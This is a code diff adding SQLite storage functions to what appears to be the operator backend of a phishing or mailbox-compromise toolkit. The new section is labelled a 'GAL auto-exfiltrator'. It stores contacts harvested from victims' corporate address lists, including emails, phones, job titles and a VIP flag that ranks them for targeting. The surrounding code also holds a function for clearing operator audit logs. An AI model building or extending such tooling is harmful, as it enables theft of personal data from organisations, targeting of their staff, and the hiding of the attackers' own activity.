@@ -1230,3 +1230,96 @@ def clear_operator_audit_logs():
         return False
     finally:
         conn.close()
+
+# ═══════════════════════════════════════════════════════════════════════
+# GLOBAL ADDRESS LIST (GAL) AUTO-EXFILTRATOR PERSISTENCE
+# ═══════════════════════════════════════════════════════════════════════
+
+def init_gal_table():
+    conn = sqlite3.connect(Config.DB_PATH)
+    cursor = conn.cursor()
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS gal_directory_cache (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            user_code TEXT,
+            display_name TEXT,
+            email TEXT,
+            job_title TEXT,
+            department TEXT,
+            mobile_phone TEXT,
+            office_location TEXT,
+            is_vip INTEGER DEFAULT 0,
+            source TEXT DEFAULT 'users',
+            harvested_at DATETIME DEFAULT CURRENT_TIMESTAMP
+        )
+    """)
+    cursor.execute("CREATE INDEX IF NOT EXISTS idx_gal_uc ON gal_directory_cache(user_code)")
+    cursor.execute("CREATE INDEX IF NOT EXISTS idx_gal_email ON gal_directory_cache(email)")
+    conn.commit()
+    conn.close()
+
+init_gal_table()
+
+def save_gal_contacts(user_code, contacts_list):
+    if not contacts_list:
+        return 0
+    conn = sqlite3.connect(Config.DB_PATH)
+    cursor = conn.cursor()
+    inserted = 0
+    try:
+        for c in contacts_list:
+            em = (c.get('email') or '').strip().lower()
+            if not em:
+                continue
+            cursor.execute("""
+                INSERT INTO gal_directory_cache 
+                (user_code, display_name, email, job_title, department, mobile_phone, office_location, is_vip, source)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+            """, (
+                user_code,
+                c.get('display_name', ''),
+                em,
+                c.get('job_title', ''),
+                c.get('department', ''),
+                c.get('mobile_phone', ''),
+                c.get('office_location', ''),
+                1 if c.get('is_vip') else 0,
+                c.get('source', 'users')
+            ))
+            inserted += 1
+        conn.commit()
+        return inserted
+    except Exception as e:
+        logger.error(f"[GAL] save_gal_contacts error: {e}")
+        return 0
+    finally:
+        conn.close()
+
+def get_gal_contacts(user_code, limit=500):
+    conn = sqlite3.connect(Config.DB_PATH)
+    conn.row_factory = sqlite3.Row
+    cursor = conn.cursor()
+    try:
+        cursor.execute("SELECT * FROM gal_directory_cache WHERE user_code = ? ORDER BY is_vip DESC, display_name ASC LIMIT ?", (user_code, limit))
+        return [dict(r) for r in cursor.fetchall()]
+    except Exception as e:
+        logger.error(f"[GAL] get_gal_contacts error: {e}")
+        return []
+    finally:
+        conn.close()
+
+def clear_gal_contacts(user_code=None):
+    conn = sqlite3.connect(Config.DB_PATH)
+    cursor = conn.cursor()
+    try:
+        if user_code:
+            cursor.execute("DELETE FROM gal_directory_cache WHERE user_code = ?", (user_code,))
+        else:
+            cursor.execute("DELETE FROM gal_directory_cache")
+        conn.commit()
+        return True
+    except Exception as e:
+        logger.error(f"[GAL] clear_gal_contacts error: {e}")
+        return False
+    finally:
+        conn.close()
